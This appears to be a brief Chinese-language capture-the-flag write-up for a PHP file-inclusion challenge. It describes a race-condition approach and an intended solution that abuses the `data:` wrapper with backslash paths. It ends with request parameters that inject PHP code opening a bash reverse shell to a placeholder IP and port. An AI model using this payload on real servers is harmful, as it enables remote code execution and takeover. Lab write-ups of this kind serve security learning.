# Solve
這題目經過大神提點，有說到可以利用 race condition，可以利用兩個 thread，一個去寫正常的值，一個去寫 reverse shell，在 include 時如果可以透過另一個 thread 去改檔案內的值。
而 strlen 可以透過 `i[ ]` 繞過
程式碼看 solve.py
之後跑去私訊 kaibro，他說正規解是透過`data: protocol`，因此透過 `data://` 但不知為何，把`/`改成`\`就能過了，猜測是 php 對 `/`和`\`不敏感
解：
```
f = data:\\text\plain;mydir
i = data:\\text\plain;mydir/meow
c[] = <?php system("bash -c 'bash -i >%26/dev/tcp/<ip>/<port> 0>%261' "); ?>
```
